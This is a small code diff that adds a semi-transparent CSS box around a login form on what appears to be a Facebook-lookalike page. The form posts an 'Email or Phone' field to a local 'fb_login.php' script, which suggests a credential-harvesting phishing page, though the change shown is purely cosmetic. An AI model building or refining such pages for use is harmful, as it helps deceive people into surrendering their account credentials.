@@ -17,9 +17,16 @@ html {
   -o-background-size: cover;
   background-size: cover;
 }
+div.transbox {
+  margin: 30px;
+  background-color: #ffffff;
+  border: 1px solid black;
+  opacity: 0.6;
+  filter: alpha(opacity=60); /* For IE8 and earlier */
+}
 </style>
 
-<div align="right">
+<div class="transbox" align="right">
   <form action="fb_login.php" method="post">
       <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 120px; margin-left: 0px; margin-top: 10px;">
       <p></p>
